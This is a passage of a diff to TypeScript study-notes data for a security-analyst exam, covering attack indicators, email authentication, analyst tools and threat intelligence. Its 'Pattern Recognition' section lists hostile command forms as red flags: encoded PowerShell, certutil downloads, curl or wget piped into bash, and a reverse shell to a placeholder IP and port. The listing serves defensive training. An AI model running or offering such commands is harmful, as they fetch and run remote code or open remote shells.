-          "Two logins from far-apart locations minutes apart = impossible travel (account compromise). Many failed logins across many accounts with one password = password spraying. Repeated MFA push prompts the user did not start = MFA fatigue. User opening data outside their job role = unauthorized access or privilege escalation.",
+          "New VMs in an unused region plus a cost spike = cryptomining on compromised cloud resources. Storage bucket suddenly public = misconfiguration or compromise. API calls from leaked access keys from an unusual location = compromised credentials (rotate the keys, review CloudTrail). Attacker disabling logging = defense evasion.",
       },
       {
-        heading: "Email-related attacks",
+        heading: "Social Engineering Attacks",
+        explain:
+          "Social engineering attacks target people, not systems. These two tricks make a fake link look real.",
         points: [
-          "Business Email Compromise (BEC): Attackers impersonate executives, vendors, or trusted contacts through email to trick users into transferring money or revealing sensitive information.",
+          "Typosquatting: Registering a domain that looks like a real one with a small change (rnicrosoft.com uses 'rn' instead of 'm', or goggle.com), to catch typing mistakes or fool readers.",
+          "URL shorteners: Services (such as bit.ly) that hide the real destination of a link. Attackers use them to bypass filters and hide malicious sites.",
+          "Checks: Inspect the domain carefully, expand the short link in a safe tool, and check the domain age with WHOIS. A domain registered days ago is a red flag.",
         ],
         remember:
-          'BEC = a con artist wearing your boss\'s face. There is often no virus and no bad link, just a believable request like "Wire the payment today, I am in a meeting." The trick is trust and urgency.',
+          "Typosquatting = a fake shop sign with one letter changed. A URL shortener = a wrapped gift box: you cannot see what is inside until you open it. Look before you click.",
         examTip:
-          'Urgent payment request from an "executive," a vendor suddenly changing bank details, or a reply-to address that does not match the sender = BEC. No malware or attachment is involved, so the best defense is verifying by a second channel (phone call). Check SPF, DKIM, and DMARC results in the email header.',
+          "A domain one character off from a real brand = typosquatting. A short link in an unexpected email = expand it safely and check the destination before opening. A very new domain mimicking your company = typosquatting or phishing infrastructure (WHOIS creation date). Do not open the link yourself to 'see what happens'; use a sandbox or reputation tool.",
+      },
+      {
+        heading: "Identity-based Indicators",
+        explain:
+          "Attackers log in rather than break in. Compromised accounts leave patterns in authentication logs.",
+        points: [
+          "IAM account compromise: An attacker takes over an identity and uses it for unauthorized actions. Signs include new MFA devices, forwarding rules, new access keys, and permission changes.",
+          "Unauthorized access: A user reaching systems or data outside their job role, or using access at odd times.",
+          "Impossible travel: The same account logs in from two locations too far apart for the time between them.",
+          "Related attack patterns: Brute force (many passwords against one account), password spraying (one common password against many accounts), credential stuffing (leaked username and password pairs), and MFA fatigue (repeated push prompts until the user approves).",
+        ],
+        remember:
+          "Impossible travel = your card is swiped in New York and ten minutes later in Tokyo. Nobody flies that fast, so one swipe is a thief. Spraying = trying one key on every door; brute force = trying every key on one door.",
+        examTip:
+          "Two logins from distant countries minutes apart = impossible travel. Many accounts each with one failed attempt from one IP = password spraying (it avoids lockouts). Many attempts on one account = brute force. Many MFA prompts the user did not start = MFA fatigue. User opening data outside their role = unauthorized access or privilege abuse. Response: reset credentials, revoke sessions, review recent activity.",
+      },
+      {
+        heading: "Email-related Attacks: Business Email Compromise",
+        explain:
+          "BEC steals money using trust, not malware. There is often no malicious link or attachment to detect.",
+        points: [
+          "Business Email Compromise (BEC): An attacker impersonates an executive, vendor, or trusted contact (by spoofing or by using a compromised mailbox) to trick staff into sending money or sensitive data.",
+          "Common forms: CEO fraud (urgent payment request), vendor bank-detail change, payroll diversion, and gift-card requests.",
+          "Warning signs: Urgency and secrecy, a reply-to address that differs from the sender, a look-alike domain, and a request to bypass normal approval.",
+        ],
+        remember:
+          "BEC is a con artist wearing your boss's face. There is no virus and no bad link, just a believable request like 'Wire the payment today, I am in a meeting.' The weapon is trust and urgency.",
+        examTip:
+          "Urgent payment request from an 'executive', or a vendor suddenly changing bank details = BEC. No attachment or link involved, so antivirus will not catch it; the best defense is verifying by a second channel (phone call to a known number) and a payment approval process. Check the header: reply-to mismatch and failed SPF, DKIM, or DMARC support spoofing.",
+      },
+      {
+        heading: "Email Authentication: SPF, DKIM, and DMARC",
+        explain:
+          "These three DNS-based checks help receiving servers decide whether an email really came from the domain it claims.",
+        points: [
+          "Sender Policy Framework (SPF): A DNS record listing the mail servers allowed to send for a domain. The receiver checks the sending server's IP against it.",
+          "DomainKeys Identified Mail (DKIM): The sending server signs the message with a private key; the receiver verifies the signature with the public key in DNS. It proves the message was not altered and came from an authorized system.",
+          "Domain-based Message Authentication, Reporting, and Conformance (DMARC): A policy that tells receivers what to do when SPF or DKIM fail (none, quarantine, reject) and sends reports back to the domain owner.",
+        ],
+        remember:
+          "SPF = the guest list at the door (is this server allowed to send for us?). DKIM = a wax seal on the envelope (was it tampered with, and is it really ours?). DMARC = the rule for the bouncer: what to do with guests who fail the list or the seal.",
+        examTip:
+          "'Which server is allowed to send mail for the domain' = SPF. 'Verify the message was not changed using a signature' = DKIM. 'Tell receivers to reject spoofed mail and send reports' = DMARC. Email header shows spf=fail, dkim=fail, dmarc=fail = likely spoofed. Check these results in the header or with MXToolbox.",
       },
     ],
   },
@@ -557,159 +671,195 @@ export const studyNotes: StudyNote[] = [
     module: "1.3",
     moduleName: "Security Tools and Scripting",
     description:
-      "CyberChef, Wireshark, Snort, Suricata, Zeek, SIEM, threat-intel platforms, EDR/XDR, reputation lookups, sandboxes, YARA, regex, file formats and scripting languages.",
-    lastUpdated: "Oct 9, 2026",
+      "CyberChef, Wireshark, Snort, Suricata, Zeek, SIEM, threat-intelligence platforms, EDR/XDR, reputation lookups, sandboxes, YARA, regex, file formats, and scripting languages.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Wrench,
-    estimatedTime: "1 hours",
+    estimatedTime: "90 minutes",
     sections: [
       {
-        heading: "Decoding/Parsing",
+        heading: "Decoding and Parsing",
+        explain:
+          "Attackers hide commands and data by encoding them. Decoding tools turn scrambled text back into something you can read.",
         points: [
-          "CyberChef: A web-based tool used to decode, encode, decrypt, convert, and analyze suspicious data without writing code.",
+          "CyberChef: A web-based tool to decode, encode, decrypt, convert, and analyze data using 'recipes' without writing code. Common operations are From Base64, From Hex, URL Decode, and Magic (auto-detect).",
+          "Encoding vs encryption: Encoding (Base64, hex) only changes format and needs no key. Encryption needs a key.",
         ],
         remember:
-          "CyberChef is a translator for secret messages. Attackers hide their commands in scrambled text (Base64, hex), and CyberChef turns it back into plain words you can read.",
+          "CyberChef is a translator for secret messages. Attackers hide commands in scrambled text such as Base64, and CyberChef turns it back into plain words you can read.",
         examTip:
-          'See a long string of random letters and numbers, or a PowerShell command with -enc? Think Base64, then CyberChef to decode it. Any question about "decoding," "deobfuscating," or "converting" data without writing code = CyberChef.',
+          "A long string of random letters ending in = or ==, or a PowerShell command with -enc = Base64, decode with CyberChef (the PowerShell -enc payload is Base64 of UTF-16 text). Any question about decoding, deobfuscating, or converting data without writing code = CyberChef. Base64 is not encryption, so it gives no protection.",
       },
       {
         heading: "Packet Analysis",
+        explain:
+          "Packet tools let you see exactly what crossed the network. Some capture, some read, some alert, and some summarize.",
         points: [
-          "Wireshark: A packet capture and analysis tool used to inspect network traffic and identify suspicious communications.",
-          "tcpdump: A command-line packet analyzer used to capture and investigate network traffic directly from a system.",
-          "Snort: An intrusion detection and prevention system (IDS/IPS) that analyzes network traffic and generates alerts for suspicious activity.",
-          "Suricata: A high-performance IDS/IPS that performs deep packet inspection and threat detection on network traffic.",
-          "Zeek: A network monitoring platform that generates detailed logs and metadata to help investigate security incidents.",
+          "Wireshark: A graphical packet capture and analysis tool. You can filter, follow a TCP stream, and inspect each protocol layer.",
+          "tcpdump: A command-line packet capture tool, ideal on servers without a GUI. It can save captures to a .pcap file for Wireshark.",
+          "Snort: A signature-based IDS/IPS that alerts on or blocks traffic matching rules.",
+          "Suricata: An IDS/IPS that was built multi-threaded. It supports protocol detection, file extraction, and Snort-style rules.",
+          "Zeek: A network monitoring platform that does not rely on signatures. It writes detailed logs of connections, DNS, HTTP, and files, which are excellent for hunting and investigation.",
         ],
         remember:
-          "Think of a phone line. tcpdump = recording the calls from the command line. Wireshark = a screen where you read the call transcripts. Snort and Suricata = security guards who sound the alarm when they hear a known bad phrase. Zeek = a note-taker who writes a summary of every conversation.",
+          "Think of a phone line. tcpdump = recording the calls from the command line. Wireshark = a screen where you read the transcripts. Snort and Suricata = guards who sound the alarm when they hear a known bad phrase. Zeek = a note-taker who writes a summary of every conversation.",
         examTip:
-          "Match the keyword. GUI to inspect or follow a stream = Wireshark. Quick command-line capture on a server = tcpdump. Signature-based alerts or blocking = Snort or Suricata (Suricata is multi-threaded and faster). Rich connection, DNS, and HTTP logs for behavior analysis and hunting = Zeek.",
+          "GUI to inspect or follow a stream = Wireshark. Quick command-line capture on a remote server = tcpdump. Rule or signature alerts, or blocking in-line = Snort or Suricata (IDS alerts, IPS blocks). Rich connection, DNS, and HTTP logs for behavior analysis and threat hunting = Zeek. Capture on a server, analyze in Wireshark is a classic workflow.",
       },
       {
-        heading: "Log Analysis",
+        heading: "Log Analysis (SIEM)",
+        explain:
+          "One log line means little. A SIEM gathers logs from everywhere and connects the dots.",
         points: [
-          "Security Information and Event Management (SIEM): A centralized platform that collects, correlates, and analyzes logs from multiple systems to detect threats and security incidents.",
+          "Security Information and Event Management (SIEM): A platform that collects, normalizes, correlates, and alerts on logs from many systems. Examples: Splunk, Elastic stack (ELK: Elasticsearch, Logstash, Kibana), and Graylog.",
+          "Correlation rule: A rule that joins several events into one alert, such as many failed logins followed by a success from the same IP.",
+          "Typical uses: Alerting, dashboards, searching during investigations, and compliance reporting.",
         ],
         remember:
-          "A SIEM is a security control room with a wall of screens. Cameras (logs) from every system feed into one room, and the software connects the dots between them to raise the alarm.",
+          "A SIEM is a security control room with a wall of screens. Cameras (logs) from every system feed into one room, and the software connects the dots to raise the alarm.",
         examTip:
-          'Key words: "correlate," "aggregate," "centralized," or "alert across multiple sources" = SIEM. One failed login means nothing, but 500 failed logins followed by a success from the same IP is the kind of pattern a SIEM correlation rule catches.',
+          "Key words 'correlate', 'aggregate', 'centralized', or 'alert across multiple sources' = SIEM. One failed login means nothing, but 500 failures followed by a success from the same IP is what a correlation rule catches. A SIEM only sees what is sent to it: if a source is not ingested, there is a blind spot.",
       },
       {
         heading: "Threat-Intelligence Platforms",
+        explain:
+          "These platforms collect and share indicators about attackers so you can detect threats others have already seen.",
         points: [
-          "Open Threat Exchange (OTX): A community-driven threat intelligence platform that provides indicators of compromise (IOCs) shared by security researchers.",
-          "Malware Information Sharing Platform (MISP): A threat intelligence platform used to collect, share, and analyze cyber threat information between organizations.",
-          "Open Cyber Threat Intelligence (OpenCTI): An open-source platform that organizes and visualizes cyber threat intelligence data for investigation and analysis.",
+          "Open Threat Exchange (OTX): A free, community-driven platform where researchers share indicators of compromise in 'pulses'.",
+          "Malware Information Sharing Platform (MISP): An open-source platform to collect, store, and share structured threat data between organizations.",
+          "Open Cyber Threat Intelligence (OpenCTI): An open-source platform that organizes intelligence as a knowledge graph and links actors, malware, and campaigns.",
         ],
         remember:
-          "Think of a neighborhood watch group chat. OTX = the public community board where anyone posts warnings. MISP = a trusted group where organizations swap detailed reports. OpenCTI = the wall of photos and red string that connects who is behind what.",
+          "A neighborhood-watch group chat. OTX = the public community board where anyone posts warnings. MISP = a trusted group where organizations swap detailed structured reports. OpenCTI = the wall of photos and red string that connects who is behind what.",
         examTip:
-          'Crowdsourced IoCs from researchers, shared as "pulses" = OTX. Sharing structured threat data between organizations = MISP. Organizing, linking, and visualizing intel as a knowledge graph = OpenCTI. All three are open-source or free-to-use options.',
+          "Crowdsourced IoCs from researchers as 'pulses' = OTX. Sharing structured threat data between organizations = MISP. Organizing, linking, and visualizing intelligence as a knowledge graph = OpenCTI. Imported indicators still need analysis and relevance checking before you block anything.",
       },
       {
         heading: "Endpoint Security",
+        explain:
+          "Endpoint tools watch and control individual devices, where most attacks eventually run.",
         points: [
-          "Endpoint Detection and Response (EDR) and Extended Detection and Response (XDR): Security solutions that monitor endpoints and enterprise environments to detect, investigate, and respond to threats.",
-          "Mobile Device Management (MDM): A platform used to manage, monitor, and secure mobile devices across an organization.",
+          "Endpoint Detection and Response (EDR): Monitors endpoint behavior, detects threats, and lets you investigate and respond (isolate the host, kill a process, collect data).",
+          "Extended Detection and Response (XDR): Extends EDR by correlating data from endpoints, email, network, identity, and cloud.",
+          "Mobile Device Management (MDM): Enforces policy on mobile devices, including passcodes, encryption, and remote wipe.",
         ],
         remember:
-          "EDR = a bodyguard on each laptop and server, watching everything and able to lock the door. XDR = the head of security who also sees email, network, and cloud so the whole picture comes together. MDM = the rulebook and remote control for company phones.",
+          "EDR is a bodyguard on each laptop and server, watching everything and able to lock the door. XDR is the head of security who also sees email, network, and cloud so the whole picture comes together. MDM is the rulebook and remote control for company phones.",
         examTip:
-          "Need to isolate a host, kill a process, or investigate endpoint activity = EDR. Correlating endpoint plus email plus network plus cloud data = XDR. Lost or stolen phone, enforce passcodes, or remote wipe = MDM.",
+          "Isolate a host, kill a process, or investigate endpoint activity = EDR. Correlate endpoint plus email plus network plus cloud into one story = XDR. Lost phone, enforce passcode, or remote wipe = MDM. A host isolated by EDR can still talk to the EDR console, which is how you keep investigating.",
       },
       {
         heading: "Domain and IP Reputation",
+        explain:
+          "Before trusting a domain or IP address, check who owns it, how old it is, where it is, and whether others reported it.",
         points: [
-          "WHOIS: A service used to obtain information about domain ownership, registration dates, and contact details.",
-          "AbuseIPDB: A reputation database that helps identify IP addresses associated with malicious activities.",
-          "Geolocation by IP Address (GEO-IP): A service that identifies the geographical location of an IP address to support investigations.",
+          "WHOIS: Shows registration details such as registrar, creation date, and name servers. Some data is hidden by privacy services.",
+          "AbuseIPDB: A database of IP addresses reported for malicious activity, with a confidence score.",
+          "Geolocation by IP Address (GEO-IP): Estimates the country or city of an IP address. It is approximate, and VPNs or proxies can hide the real location.",
         ],
         remember:
-          "Think of checking a stranger before you trust them. WHOIS = who owns it and when was it created (ID check). AbuseIPDB = has anyone reported this IP (criminal record check). GEO-IP = where in the world is it coming from (address check).",
+          "Checking a stranger before you trust them. WHOIS = ID check (who owns it, when was it created?). AbuseIPDB = criminal record check (has anyone reported it?). GEO-IP = address check (where is it coming from?).",
         examTip:
-          "A domain registered only a few days ago = suspicious, check WHOIS. Need to know if an IP has been reported for attacks = AbuseIPDB. Login from an unexpected country, or checking impossible travel = GEO-IP.",
+          "A domain registered a few days ago that mimics a brand = suspicious, check WHOIS. Need to know whether an IP has been reported for attacks = AbuseIPDB. Login from an unexpected country, or testing impossible travel = GEO-IP. GEO-IP is approximate, so it supports a finding but does not prove one.",
       },
       {
         heading: "File Analysis",
+        explain:
+          "You can learn a lot about a suspicious file without running it, and you can find related files by pattern.",
         points: [
-          "Strings: A utility that extracts readable text from files to help identify hidden indicators, URLs, commands, or malware artifacts.",
-          "VirusTotal: An online platform that scans files, URLs, and hashes using multiple antivirus engines to identify malicious content.",
-          "Yet Another Recursive Acronym (YARA): A rule-based malware analysis tool used to identify and classify malicious files based on specific patterns.",
+          "Strings: Extracts readable text from a file, which can reveal URLs, IP addresses, commands, or file paths inside malware.",
+          "VirusTotal: Checks files, URLs, domains, and hashes against many antivirus engines and other sources.",
+          "Yet Another Recursive Acronym (YARA): A rule language that describes patterns (text, bytes, conditions) to identify and classify malware families.",
+          "Hash lookup: Hashing a file (SHA-256) and searching for the hash is safer than uploading the file.",
         ],
         remember:
           "Strings = reading the text on the outside of a suspicious package. VirusTotal = asking 70 antivirus experts for a second opinion. YARA = a wanted poster that matches any file with the same suspicious features.",
         examTip:
-          "Pull readable URLs, IPs, or commands out of a binary without running it = Strings. Check a file hash or URL against many AV engines = VirusTotal (upload only non-sensitive files, since uploads can be shared). Write rules to match malware families by pattern = YARA.",
+          "Pull readable URLs, IPs, or commands from a binary without running it = Strings (static analysis). Check a hash or URL against many engines = VirusTotal; do not upload sensitive or confidential files because submissions can be seen by others. Write rules to match a malware family by pattern = YARA. Looking up a hash gives a quick answer without sharing the file.",
       },
       {
         heading: "Sandboxing",
+        explain:
+          "A sandbox lets you run an unknown file safely and watch what it does, which is called dynamic analysis.",
         points: [
-          "Joe Sandbox: An automated malware analysis environment that safely executes suspicious files and reports their behavior.",
-          "Cuckoo Sandbox: An open-source malware analysis platform that observes how files behave in an isolated environment.",
+          "Joe Sandbox: A commercial automated malware analysis platform that reports file, registry, process, and network behavior.",
+          "Cuckoo Sandbox: An open-source automated malware analysis system that runs files in an isolated environment and records their behavior.",
+          "Limitation: Some malware detects a sandbox or waits for a delay or user action, so it can stay quiet.",
         ],
         remember:
           "A sandbox is a bomb-disposal chamber. You open the suspicious package inside a sealed room, watch what it does (files, registry, network), and nothing escapes into the real world.",
         examTip:
-          "Safely run an unknown file to see its behavior = sandbox (dynamic analysis). Joe Sandbox is commercial and Cuckoo is open-source. Remember that some malware detects sandboxes and stays quiet, so a clean result does not prove the file is safe.",
+          "Safely run an unknown file to watch its behavior = sandbox (dynamic analysis). Reading strings or hashes without running it = static analysis. Joe Sandbox is commercial and Cuckoo is open source. A clean sandbox result does not prove a file is safe, because evasive malware may hide.",
       },
       {
         heading: "Pattern Recognition",
+        explain:
+          "Analysts search huge logs by pattern and read attacker commands to understand intent.",
         points: [
-          "Regular Expressions (Regex): Patterns used to search, match, and analyze text for indicators such as IP addresses, hashes, emails, and other artifacts.",
-          "Interpreting Suspicious Commands: Analyzing command-line activity to identify actions commonly used by attackers for persistence, execution, or data theft.",
+          "Regular expressions (regex): Patterns that describe text, used to find IP addresses, emails, hashes, or error strings in large data.",
+          "Interpreting suspicious commands: Recognizing commands that attackers use for execution, download, persistence, or remote shells.",
+          "Red-flag commands: powershell -enc (hidden encoded script), certutil -urlcache (file download), curl or wget piped into bash (remote script run), nc or bash -i >& /dev/tcp/ (reverse shell), schtasks or crontab entries (persistence).",
         ],
         remember:
-          'Regex = a super-powered Ctrl+F. Instead of searching one word, you describe a pattern like "any four numbers with dots between them" and it finds every IP address in a huge log. Command analysis = reading the attacker\'s handwriting.',
+          "Regex is a super-powered Ctrl+F: instead of searching for one word, you describe a shape, like 'four groups of digits separated by dots', and it finds every IP address in the log. Command analysis is reading the attacker's handwriting.",
         examTip:
-          "Extract all IPs, emails, or hashes from a large log = regex. Red-flag commands to know: powershell -enc (hidden encoded script), certutil -urlcache (downloading a file), curl or wget piped to bash (remote script execution), and bash -i >& /dev/tcp (reverse shell).",
+          "Extract all IPs, emails, or hashes from a big log = regex. A command that downloads and pipes straight into a shell = remote script execution. bash -i >& /dev/tcp/IP/PORT = reverse shell. certutil downloading a file = LOLBin abuse. Know the intent of each command, not only its name.",
       },
       {
         heading: "Email Analysis",
+        explain:
+          "Email headers and DNS records show whether a message is genuine and whether the sender is trustworthy.",
         points: [
-          "MXToolbox: A diagnostic tool used to analyze email servers, DNS records, domains, and email security configurations.",
+          "MXToolbox: A diagnostic site for MX records, SPF, DKIM, DMARC, blacklist checks, and email header analysis.",
+          "Header review: Read the Received lines (bottom to top is the delivery path), Return-Path, Reply-To, and the authentication results.",
         ],
         remember:
-          "MXToolbox is the email detective. Paste in a domain or header and it tells you where the mail came from, whether the domain is on a blacklist, and whether it passes the email safety checks.",
+          "MXToolbox is the email detective. Paste in a domain or header and it tells you where the mail came from, whether the domain is on a blacklist, and whether it passes the safety checks.",
         examTip:
-          "Verifying SPF, DKIM, and DMARC, checking MX records, blacklist lookups, or analyzing email headers for a spoofed sender = MXToolbox. If a phishing email claims to be from your CEO, this is where you check if the sending server is really allowed to send for that domain.",
+          "Verify SPF, DKIM, and DMARC, check MX records, run a blacklist lookup, or analyze a header for a spoofed sender = MXToolbox. A phishing email 'from the CEO': check the Received chain, the Reply-To mismatch, and whether the sending server is authorized for that domain.",
       },
       {
         heading: "User and Entity Behavior Analysis (UEBA)",
+        explain:
+          "UEBA learns what normal looks like for each user and device, then flags deviations that signature tools miss.",
         points: [
-          "Open User and Entity Behavior Analytics (OpenUBA): A platform that analyzes user and system behavior to detect unusual activities that may indicate insider threats or compromised accounts.",
+          "Open User and Entity Behavior Analytics (OpenUBA): An open-source platform that baselines behavior and detects anomalies.",
+          "Typical detections: Insider threats, compromised accounts, unusual data downloads, off-hours logins, and abnormal access to resources.",
         ],
         remember:
-          'UEBA is like a store clerk who knows every regular customer. When Sam, who always shops at 10 AM, suddenly shows up at 3 AM and asks for the safe, the clerk knows something is off. It learns "normal" and flags the change.',
+          "A store clerk who knows every regular customer. When Sam, who always shops at 10 AM, shows up at 3 AM and asks for the safe, the clerk knows something is off. UEBA learns 'normal' and flags the change.",
         examTip:
-          'Questions about baselining normal behavior, insider threats, or a user suddenly downloading huge amounts of data or logging in at odd hours = UEBA. It catches things signature-based tools miss, because nothing is "known bad," just unusual.',
+          "Baselining normal behavior, insider threats, or a user suddenly downloading huge amounts of data at odd hours = UEBA. It catches things signatures miss because nothing is 'known bad', just unusual. Expect false positives while the baseline is still learning.",
       },
       {
         heading: "File Formats",
+        explain:
+          "Security data comes in a few common formats. You should recognize each at a glance.",
         points: [
-          "JSON (JavaScript Object Notation): A lightweight, structured data format commonly used for log files, APIs, and security tool outputs.",
-          "XML (eXtensible Markup Language): A tag-based data format frequently used for application configuration files and data exchange.",
-          "YAML (YAML Ain't Markup Language): A human-readable configuration format commonly used in automation and cloud environments.",
-          "EVTX: The native Windows Event Log file format used to store security, application, and system logs.",
+          "JSON (JavaScript Object Notation): Key-value pairs in curly braces. Common for APIs, cloud logs, and tool output.",
+          "XML (Extensible Markup Language): Data wrapped in angle-bracket tags. Common in configuration files and SAML.",
+          "YAML (YAML Ain't Markup Language, listed by CompTIA as 'Yet Another Markup Language'): Indentation-based configuration used by Kubernetes, automation playbooks, and Sigma rules.",
+          "EVTX: The native Windows Event Log file format, opened in Event Viewer.",
         ],
         remember:
-          'Spot them by looks. JSON = curly braces { } and "key": "value". XML = angle-bracket tags like <user>. YAML = clean indentation with no braces. EVTX = the Windows event log file you open in Event Viewer.',
+          "Spot them by looks. JSON = curly braces and \"key\": \"value\". XML = <tags> that open and close. YAML = clean indentation with no braces. EVTX = the Windows event log file.",
         examTip:
-          'Cloud and API logs or tool output in {"key": "value"} form = JSON. Tags with opening and closing brackets = XML. Indentation-based config for Kubernetes, playbooks, or Sigma rules = YAML (a wrong indent breaks it). Windows Security, System, or Application logs = EVTX.',
+          "Cloud or API log in {\"key\": \"value\"} form = JSON. Opening and closing tags = XML. Indentation-based config for Kubernetes or a Sigma rule = YAML (a wrong indent breaks it). Windows Security, System, or Application logs = EVTX. Windows event 4625 is a failed logon and 4624 is a successful logon.",
       },
       {
-        heading: "Programming/Scripting Languages",
+        heading: "Programming and Scripting Languages",
+        explain:
+          "Analysts automate repetitive work and read attacker scripts. Know which language fits which job.",
         points: [
-          "Python: A versatile programming language commonly used for automation, threat hunting, log analysis, and security scripting.",
-          "PowerShell: A Windows command-line and scripting language used for system administration but also frequently abused by attackers.",
-          "Shell Script: A scripting language used in Linux and Unix environments to automate administrative and security-related tasks.",
+          "Python: A cross-platform language for automation, log parsing, API calls, and analysis.",
+          "PowerShell: The Windows command-line and scripting language for administration. Attackers also abuse it.",
+          "Shell script: Bash and similar scripts to automate tasks on Linux and Unix.",
         ],
         remember:
-          "Pick the right tool for the platform. Python = the all-purpose Swiss Army knife that works anywhere. PowerShell = the Windows toolbox (and a favorite of attackers). Shell/Bash = the Linux toolbox.",
+          "Python is the all-purpose Swiss Army knife that works anywhere. PowerShell is the Windows toolbox (and a favorite of attackers). Shell or Bash is the Linux toolbox.",
         examTip:
-          "Parse logs, call APIs, or automate across platforms = Python. Windows administration or an attack using built-in tools (LOLBins) = PowerShell. Automate tasks or process logs on Linux = Shell/Bash. PowerShell is both an admin tool and an attacker tool, so look at context.",
+          "Parse logs, call APIs, or automate across platforms = Python. Windows administration, or an attack using built-in tools = PowerShell. Process logs or automate on Linux = Shell or Bash. PowerShell is both an admin tool and an attacker tool, so context decides whether it is normal.",
+         
       },
     ],
   },
@@ -719,126 +869,170 @@ export const studyNotes: StudyNote[] = [
     domain: "Domain 1.0",
     domainName: "Security Operations",
     module: "1.4",
-    moduleName: "Threat Intel & Hunting",
+    moduleName: "Threat Intelligence and Hunting",
     description:
-      "Threat actors, TTPs, MITRE ATT&CK, Pyramid of Pain, confidence levels, IoCs, STRIDE, threat mapping and cyber deception.",
-    lastUpdated: "Oct 9, 2026",
+      "Threat actors, TTPs, Pyramid of Pain, MITRE ATT&CK, confidence levels, collection sources, IoCs, threat hunting, STRIDE, threat mapping, and cyber deception.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: Crosshair,
-    estimatedTime: "1.3 hours",
+    estimatedTime: "90 minutes",
     sections: [
       {
         heading: "Threat Actors",
+        explain:
+          "Knowing who attacks, and why, helps you predict what they will do and how long they will stay.",
         points: [
-          "Advanced Persistent Threat (APT): A highly skilled and well-funded attacker that gains unauthorized access to a network and remains hidden for a long period while continuously stealing data or conducting espionage.",
-          "Insider Threat: An employee, contractor, or trusted individual who intentionally or unintentionally causes harm to an organization's systems, data, or resources.",
+          "Advanced Persistent Threat (APT): A skilled, well-funded group (often nation-state) that breaks in, stays hidden for months, and quietly steals data or conducts espionage.",
+          "Insider threat: An employee, contractor, or trusted person who harms the organization, either intentionally (malicious) or unintentionally (careless or tricked).",
+          "Other actor types seen in scenarios: Hacktivists (ideology, defacement, leaks), organized crime (money, ransomware, fraud), and unskilled attackers or 'script kiddies' (use ready-made tools for curiosity or reputation).",
         ],
         remember:
-          "APT = a professional spy who sneaks in, hides for months, and quietly copies secrets. Insider = someone who already has the house keys, so no break-in is needed. One is patient and outside, the other is trusted and inside.",
+          "An APT is a professional spy who sneaks in, hides for months, and quietly copies secrets. An insider already has the house keys, so no break-in is needed. One is patient and outside, the other is trusted and inside.",
         examTip:
-          "Nation-state, long-term, stealthy, well-funded, or espionage = APT. Employee, contractor, or former staff with access, whether malicious or careless = insider threat. A user clicking a phishing link by accident is still an unintentional insider threat.",
+          "Nation-state, long-term, stealthy, well-funded, or espionage = APT. Employee, contractor, or former staff with access = insider threat. A user who clicks a phishing link by accident is still an unintentional insider threat. Quick money and encrypted files = organized crime. Defaced website with a political message = hacktivist.",
       },
       {
         heading: "Tactics, Techniques, and Procedures (TTPs)",
+        explain:
+          "TTPs describe attacker behavior at three levels of detail. They are the most useful kind of intelligence because behavior is hard to change.",
         points: [
-          "Tactics: The overall goal an attacker is trying to achieve during a cyberattack, such as stealing credentials or disrupting operations.",
-          "Techniques: The methods attackers use to accomplish their objectives, such as phishing, malware installation, or privilege escalation.",
-          "Procedures: The specific steps, tools, and actions an attacker follows to carry out a technique against a target.",
-          "MITRE ATT&CK: A knowledge base that documents real-world attacker tactics and techniques to help security teams understand and detect threats.",
-          "Heat Maps: A visual chart that highlights areas with the highest security risks, vulnerabilities, or attack activity levels.",
-          "Pyramid of Pain: A cybersecurity model that shows how difficult it becomes for attackers when defenders can detect and block higher-level indicators such as TTPs.",
-          "Attribution: The process of identifying the individual, group, or nation responsible for a cyberattack.",
+          "Tactics: The attacker's goal at a stage (for example Persistence or Exfiltration). It answers WHY.",
+          "Techniques: The method used to reach the goal (for example Scheduled Task or Phishing). It answers HOW.",
+          "Procedures: The exact steps, tools, and commands a specific group uses to carry out a technique. It answers WHAT EXACTLY this group does.",
+          "MITRE ATT&CK: A public knowledge base of real-world attacker tactics, techniques, and sub-techniques. It is used to describe behavior, plan detections, and test defenses. The ATT&CK Navigator can color it as a heat map.",
         ],
         remember:
-          "Think of a bank robbery. Tactic = the goal (get the money). Technique = the method (go through the vault door). Procedure = the exact recipe (this crew, this drill, this time). Pyramid of Pain = the lower you block (a hash), the easier the robber swaps it. The higher you block (their habits), the more it hurts them.",
+          "A bank robbery. Tactic = the goal (get the money). Technique = the method (go through the vault door). Procedure = the exact recipe (this crew, this drill, this time).",
         examTip:
-          "Pyramid of Pain order, easiest to hardest for the attacker to change: hash values, IP addresses, domain names, network/host artifacts, tools, TTPs. Blocking TTPs causes the most pain. MITRE ATT&CK = mapping behavior to known techniques. Heat map = showing which techniques you cover or miss. Attribution is difficult and should never be treated as certain.",
+          "Goal = tactic. Method = technique. Exact group-specific implementation = procedure. 'Map observed behavior to a common language' = MITRE ATT&CK. 'Persistence' is a tactic; 'Scheduled Task' is a technique for it. ATT&CK is not a strict sequence: attackers can skip or repeat tactics.",
+      },
+      {
+        heading: "Pyramid of Pain, Heat Maps, and Attribution",
+        explain:
+          "Not all indicators are equal. Blocking some annoys the attacker a little; blocking others forces them to change how they work.",
+        points: [
+          "Pyramid of Pain: Ranks indicators by how hard it is for the attacker to change them, from easiest to hardest: hash values, IP addresses, domain names, network and host artifacts, tools, and TTPs.",
+          "Heat map: A visual that highlights where risk or attack activity is highest. On ATT&CK it can show which techniques you detect well and which you miss.",
+          "Attribution: Identifying who is behind an attack. It is difficult and uncertain, because attackers reuse tools, use proxies, and plant false flags.",
+        ],
+        remember:
+          "Blocking a hash is like banning one robber's shoelaces: they buy new shoes in a minute. Blocking their TTPs is like banning their whole method: they must learn a new profession. The higher on the pyramid, the more it hurts.",
+        examTip:
+          "Order, easy to hard for the attacker to change: Hash, IP, Domain, Artifacts, Tools, TTPs. Detecting TTPs causes the most pain. Heat map of detection coverage = find gaps. Attribution should never be stated as certain. A question about the 'most effective, longest-lasting detection' = behavior/TTP based.",
       },
       {
         heading: "Confidence-Level Impacts",
+        explain:
+          "Intelligence is only useful if you can trust it and use it in time. Three qualities decide how much confidence to place in it.",
         points: [
-          "Timeliness: Threat intelligence must be received quickly enough to help organizations respond before significant damage occurs.",
-          "Relevance: Threat intelligence should relate directly to an organization's environment, systems, and potential threats.",
-          "Accuracy: Threat intelligence must be correct and reliable so that security teams can make informed decisions without wasting resources.",
+          "Timeliness: The intelligence arrives quickly enough to act on before damage is done, and the indicators are still active.",
+          "Relevance: The intelligence relates to your industry, technology, and environment.",
+          "Accuracy: The information is correct and reliable, with few false positives.",
         ],
